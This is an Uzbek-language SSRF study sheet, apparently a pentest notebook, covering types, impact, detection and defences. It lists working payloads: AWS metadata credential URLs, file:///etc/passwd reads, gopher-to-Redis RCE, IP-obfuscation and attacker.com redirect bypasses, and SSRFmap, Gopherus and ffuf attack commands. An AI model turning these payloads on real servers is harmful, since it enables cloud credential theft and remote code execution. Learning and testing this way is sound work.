# Server-Side Request Forgery (SSRF)

> Lab yechimlari (PortSwigger'ning 7 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Ilova senga URL/manzil kiritishga ruxsat beradi (webhook, "import from URL", avatar from URL),
keyin **server o'sha manzilga o'zi so'rov yuboradi**. Agar manzil tekshirilmasa, sen serverni
o'zing xohlagan joyga — ichki tarmoqqa, `localhost`, cloud metadata'ga — so'rov yuborishga
majbur qilasan. Server esa sen (tashqi odam) yetolmaydigan ichki joylarga yetadi.

**Ildiz sabab:** server foydalanuvchi bergan manzilga ishonib, uni proxy qilib ishlaydi. Ichki
tarmoq va metadata endpoint'lari esa "ichkaridan kelgan so'rov ishonchli" deb o'ylaydi → himoya yo'q.

## Turlari
- **Basic (in-band)** — javob senga qaytadi (ichki sahifa/metadata matni ko'rinadi).
- **Blind SSRF** — javob ko'rinmaydi; DNS/HTTP callback (Collaborator) bilan tasdiqlaysan;
  ba'zan ichki xizmatdagi zaiflik (Shellshock) bilan natija chiqarasan.
- **Semi-blind** — faqat status/xato/vaqt farqi qaytadi.
- **Filtr bo'yicha**: blacklist bypass (`127.1`, decimal/octal), whitelist bypass (`@`, `#`),
  open-redirect chain (filtr aylanib).

## Oqibatlar (IMPACT)
- **Cloud metadata → IAM kalit → butun cloud seniki** (AWS `169.254.169.254`, GCP, Azure). **Critical**.
- Ichki servislar bilan gaplashish (admin panel, Redis, Elasticsearch, Kubernetes API).
- Ichki port scan (tarmoq topologiyasini ko'rish).
- `file://` bilan fayl o'qish; gopher bilan Redis'ga buyruq → RCE.
> SSRF + cloud metadata = eng katta to'lovlardan biri. Blind SSRF o'zi odatda Medium.

## Qayerdan qidiriladi
URL qabul qiladigan har narsa: webhook, "import from URL", avatar from URL, PDF
generator, `url=`/`redirect=`/`dest=`/`callback=`/`proxy=`, SSO metadata, `Referer`,
XXE, SVG upload.

## Aniqlash
```http
POST /api/fetch
url=http://xxx.oast.pro/     ← callback kelsa → SSRF bor
url=http://127.0.0.1/admin
```
> OOB (interactsh/Collaborator) eng ishonchli — DNS/HTTP callback kutasan.

## Asosiy targetlar
```
# AWS metadata (eng qimmat)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP (header kerak: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
# Azure (Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Ichki servis
http://127.0.0.1:6379/   (Redis)   http://127.0.0.1:9200/ (Elasticsearch)
file:///etc/passwd
gopher://127.0.0.1:6379/_...  (Redis → RCE)
```

## Filtr/WAF bypass (IP obfuscation)
| Usul | 127.0.0.1 |
|------|-----------|
| Decimal | `http://2130706433/` |
| Octal | `http://0177.0.0.1/` |
| Hex | `http://0x7f000001/` |
| Qisqa | `http://127.1/`, `http://0/` |
| IPv6 | `http://[::1]/` |

```
http://attacker.com@169.254.169.254/      # @ dan keyingisi real host
http://169.254.169.254#@target.com/
http://localtest.me/                        # 127.0.0.1 ga resolve
url=https://attacker.com/redirect → 302 → 169.254.169.254  # redirect bypass
```

## TOOLLAR

### interactsh — SSRF callback ushlagich
```bash
interactsh-client
```
> Blind SSRF'da shu domenni `url=` ga qo'yasan. Server so'rov yuborsa — sen ko'rasan, SSRF tasdiqlandi.

### SSRFmap — avtomat exploit
```bash
python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan,redis
```
> Burp request'dagi `url` parametrini olib, fayl o'qish, port scan, Redis moduli bilan avtomat uradi.

### Gopherus — gopher payload yasagich (RCE uchun)
```bash
gopherus --exploit redis
```
> Redis/MySQL/FastCGI uchun tayyor `gopher://` payload yasaydi — SSRF'ni RCE'ga aylantirasan.

### ffuf — ichki port scan SSRF orqali
```bash
ffuf -w ports.txt -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ" -fr "refused"
```
> Portlarni ketma-ket sinab, javob farqidan qaysi ichki port ochiqligini aniqlaydi.

### nuclei — SSRF shablon + OAST
```bash
nuclei -l params_urls.txt -t ~/nuclei-templates/http/vulnerabilities/ -tags ssrf -iserver "$(interactsh)"
```
> Ommaviy SSRF tekshiradi, callback'ni o'z interactsh serveringda ko'rsatadi.

## Blind SSRF — qanday foydalanish
Callback'da SSRF tasdiqlandi → ichki port scan → ichki zaif servis qidir → gopher bilan RCE.

## PoC
Metadata javobini ko'rsat (AWS credentials bo'lsa — borligini ko'rsat, kalitni o'ynatma).
Blind bo'lsa interactsh callback.

## Himoya
Allowlist (protokol+domen+IP), `file://`/`gopher://`/`dict://` bloklash, DNS resolve'dan
keyin IP tekshirish (private range rad), IMDSv2 (token majburiy), SSRF javobini clientга qaytarmaslik.
